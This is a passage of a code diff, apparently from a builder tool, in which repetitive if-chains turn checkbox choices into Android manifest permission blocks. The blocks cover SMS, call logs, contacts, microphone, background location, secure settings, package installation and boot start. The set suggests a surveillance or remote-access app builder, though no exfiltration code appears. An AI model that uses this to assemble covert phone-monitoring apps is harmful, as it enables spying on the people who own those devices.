+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
